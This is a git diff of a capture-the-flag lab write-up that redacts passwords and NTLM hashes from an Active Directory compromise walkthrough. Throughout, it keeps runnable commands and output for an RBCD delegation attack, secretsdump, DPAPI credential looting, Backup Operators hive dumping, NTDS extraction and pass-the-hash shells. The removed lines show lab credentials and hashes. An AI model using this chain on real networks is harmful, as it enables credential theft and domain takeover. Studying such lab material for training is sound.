@@ -12,7 +12,6 @@ tags: ["windows", "active-directory", "rbcd", "dpapi", "backup-operators", "bloo
 
 ## Overview
 
-**Platform:** HackSmarter
 **Difficulty:** Hard
 **Domain:** northbridge.corp
 
@@ -45,41 +44,6 @@ The engagement identified critical vulnerabilities across both systems:
 
 ---
 
-## Attack Path Overview
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│      Starting Creds → SMB Enumeration → Credential Discovery    │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     _svrautomationsvc → BloodyAD → Create Computer Account      │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│          RBCD Attack → S4U2Proxy → secretsdump (JMP01)          │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│      Local Admin (PTH) → DPAPI Dump → _backupsvc Credentials    │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     Backup Operators → SAM Dump → Machine Account Hash (DC)     │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│             NTDS Dump → Domain Admin Access                     │
-└─────────────────────────────────────────────────────────────────┘
-```
-
----
-
 # Phase 1: Enumeration (NORTHJMP01)
 
 ## 1.1 Initial Reconnaissance
@@ -87,7 +51,7 @@ The engagement identified critical vulnerabilities across both systems:
 Starting credentials provided for assumed breach:
 
 ```
-_securitytestingsvc:4kCc$A@NZvNAdK@
+_securitytestingsvc:[REDACTED]
 ```
 
 Port scanning revealed standard Windows services:
@@ -113,7 +77,7 @@ Port    Service         Version
 Validating credentials and enumerating shares:
 
 ```bash
-nxc smb 10.1.157.240 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --shares
+nxc smb 10.1.157.240 -u '_securitytestingsvc' -p '[REDACTED]' --shares
 ```
 
 ```
@@ -128,7 +92,7 @@ Network Shares  READ
 Using spider_plus to enumerate share contents:
 
 ```bash
-nxc smb 10.1.157.240 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' -M spider_plus -o DOWNLOAD_FLAG=True
+nxc smb 10.1.157.240 -u '_securitytestingsvc' -p '[REDACTED]' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
 **Interesting Files Found:**
@@ -148,16 +112,16 @@ cat backup.bat
 REM === Upload.bat ===
 SET PSCP="\\NORTHFILESRV01\Department Shares\IT\Tools\putty\pscp.exe"
 SET USER=_backupautomation
-SET PASS=1rUlHB95TVA2I&BCve
+SET PASS=[REDACTED]
 SET DEST=10.10.99.12
 ```
 
-**Credentials Found:** `_backupautomation:1rUlHB95TVA2I&BCve`
+**Credentials Found:** `_backupautomation:[REDACTED]`
 
 ## 1.4 LDAP User Enumeration
 
 ```bash
-nxc ldap 10.1.190.26 -u '_securitytestingsvc' -p '4kCc$A@NZvNAdK@' --users
+nxc ldap 10.1.190.26 -u '_securitytestingsvc' -p '[REDACTED]' --users
 ```
 
 Notable accounts discovered:
@@ -169,7 +133,7 @@ Notable accounts discovered:
 
 ```bash
 rusthound-ce -d northbridge.corp -u '_securitytestingsvc@northbridge.corp' \
-  -p '4kCc$A@NZvNAdK@' -i 10.1.190.26 -o /workspace/bloodhound_data -c All
+  -p '[REDACTED]' -i 10.1.190.26 -o /workspace/bloodhound_data -c All
 ```
 
 BloodHound revealed `_svrautomationsvc` has `WriteAccountRestrictions` on NORTHJMP01.
@@ -193,10 +157,10 @@ Example usage:
 "C:\Scripts\Server Build Automation\ServerBuildAutomation.ps1"
   -DomainName northbridge.local
   -DomainJoinUser _svrautomationsvc
-  -DomainJoinPassword yf0@EoWY4cXqmVv
+  -DomainJoinPassword [REDACTED]
 ```
 
-**Credentials Found:** `_svrautomationsvc:yf0@EoWY4cXqmVv`
+**Credentials Found:** `_svrautomationsvc:[REDACTED]`
 
 ## 2.3 OU Permission Analysis
 
@@ -209,7 +173,7 @@ $OUPath = "OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp"
 Verifying permissions with dacledit:
 
 ```bash
-dacledit.py 'northbridge/_securitytestingsvc:4kCc$A@NZvNAdK@' \
+dacledit.py 'northbridge/_securitytestingsvc:[REDACTED]' \
   -dc-ip 10.1.190.26 -principal _svrautomationsvc \
   -target-dn 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' -action read
 ```
@@ -230,16 +194,16 @@ dacledit.py 'northbridge/_securitytestingsvc:4kCc$A@NZvNAdK@' \
 Using BloodyAD to create a computer account in the ServerProvisioning OU:
 
 ```bash
-bloodyAD -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' \
+bloodyAD -d northbridge.corp -u _svrautomationsvc -p '[REDACTED]' \
   --host northdc01.northbridge.corp add computer \
   --ou 'OU=ServerProvisioning,OU=Servers,DC=northbridge,DC=corp' \
-  'NORTHTEST' 'NorthbridgeTest2025!!'
+  'NORTHTEST' '[REDACTED]'
 ```
 
 ## 3.2 Configure RBCD Delegation
 
 ```bash
-bloodyAD -d northbridge.corp -u _svrautomationsvc -p 'yf0@EoWY4cXqmVv' \
+bloodyAD -d northbridge.corp -u _svrautomationsvc -p '[REDACTED]' \
   --host northdc01.northbridge.corp add rbcd 'NORTHJMP01$' 'NORTHTEST$'
 ```
 
@@ -253,7 +217,7 @@ After testing multiple users, `gcookT1` successfully yielded credentials:
 
 ```bash
 getST.py -spn 'cifs/NORTHJMP01.northbridge.corp' -impersonate 'gcookT1' \
-  -dc-ip 10.1.190.26 northbridge.corp/NORTHTEST$:'NorthbridgeTest2025!!' \
+  -dc-ip 10.1.190.26 northbridge.corp/NORTHTEST$:'[REDACTED]' \
   -force-forwardable
 ```
 
@@ -270,7 +234,7 @@ secretsdump.py -k -no-pass northbridge.corp/gcookT1@NORTHJMP01.northbridge.corp
 
 **Local Administrator Hash:**
 ```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
 ```
 
 ---
@@ -280,7 +244,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba92
 ## 4.1 Pass-the-Hash Access
 
 ```bash
-nxc smb 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec --local-auth
+nxc smb 10.1.157.240 -u Administrator -H [HASH REDACTED] --local-auth
 ```
 
 ```
@@ -290,7 +254,7 @@ SMB  10.1.157.240  445  NORTHJMP01  [+] NORTHJMP01\Administrator (admin)
 ## 4.2 Evil-WinRM Shell
 
 ```bash
-evil-winrm -i 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec
+evil-winrm -i 10.1.157.240 -u Administrator -H [HASH REDACTED]
 ```
 
 **User Flag Retrieved!**
@@ -298,17 +262,17 @@ evil-winrm -i 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec
 ## 4.3 DPAPI Credential Extraction
 
 ```bash
-nxc smb 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec \
+nxc smb 10.1.157.240 -u Administrator -H [HASH REDACTED] \
   --local-auth --dpapi
 ```
 
 ```
 [+] Got 64 decrypted masterkeys. Looting secrets...
 [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{...}
-  - NORTHBRIDGE\_backupsvc:j0$QyPZ0JWzN2*iu^5
+  - NORTHBRIDGE\_backupsvc:[REDACTED]
 ```
 
-**Critical Credential:** `_backupsvc:j0$QyPZ0JWzN2*iu^5`
+**Critical Credential:** `_backupsvc:[REDACTED]`
 
 ---
 
@@ -319,7 +283,7 @@ nxc smb 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec \
 The `_backupsvc` account is a member of Backup Operators, allowing SAM extraction:
 
 ```bash
-nxc smb 10.1.190.26 -u '_backupsvc' -p 'j0$QyPZ0JWzN2*iu^5' -M backup_operator
+nxc smb 10.1.190.26 -u '_backupsvc' -p '[REDACTED]' -M backup_operator
 ```
 
 ```
@@ -330,7 +294,7 @@ BACKUP_O...  Saved HKLM\SECURITY to \\10.1.190.26\SYSVOL\SECURITY
 
 **Machine Account Hash:**
 ```
-$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f49c490a1dc5b36d883147b83992ad6
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]
 ```
 
 ## 5.2 NTDS Dump via Machine Account
@@ -338,20 +302,20 @@ $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7f49c490a1dc5b36d883147b83992ad6
 Using the DC machine account hash to dump NTDS:
 
 ```bash
-nxc smb 10.1.190.26 -u 'NORTHDC01$' -H 7f49c490a1dc5b36d883147b83992ad6 --ntds
+nxc smb 10.1.190.26 -u 'NORTHDC01$' -H [HASH REDACTED] --ntds
 ```
 
 ```
 [+] Dumping the NTDS, this could take a while...
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b61f9dfb32c8209f4ac9e2a5c2269cc:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:810645bd7aab33e05ff416ea948ccb10:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
 [+] Dumped 28 NTDS hashes
 ```
 
 ## 5.3 Domain Admin Access
 
 ```bash
-evil-winrm -i 10.1.190.26 -u Administrator -H 8b61f9dfb32c8209f4ac9e2a5c2269cc
+evil-winrm -i 10.1.190.26 -u Administrator -H [HASH REDACTED]
 ```
 
 **Root Flag Retrieved!**
@@ -363,15 +327,15 @@ evil-winrm -i 10.1.190.26 -u Administrator -H 8b61f9dfb32c8209f4ac9e2a5c2269cc
 ```
 Phase 1-2 - Enumeration & Discovery
 ────────────────────────────────────────────────────────────────
-_securitytestingsvc  : 4kCc$A@NZvNAdK@      → Starting creds
-_backupautomation    : 1rUlHB95TVA2I&BCve   → backup.bat
-_svrautomationsvc    : yf0@EoWY4cXqmVv      → README script
+_securitytestingsvc  : [REDACTED]            → Starting creds
+_backupautomation    : [REDACTED]            → backup.bat
+_svrautomationsvc    : [REDACTED]            → README script
 
 Phase 3-4 - NORTHJMP01 (10.1.157.240)
 ────────────────────────────────────────────────────────────────
-NORTHTEST$           : NorthbridgeTest2025!! → Rogue computer
+NORTHTEST$           : [REDACTED]            → Rogue computer
 Administrator (local): [NTLM Hash PTH]       → RBCD attack
-_backupsvc           : j0$QyPZ0JWzN2*iu^5    → DPAPI extraction
+_backupsvc           : [REDACTED]            → DPAPI extraction
 
 Phase 5 - NORTHDC01 (10.1.190.26)
 ────────────────────────────────────────────────────────────────
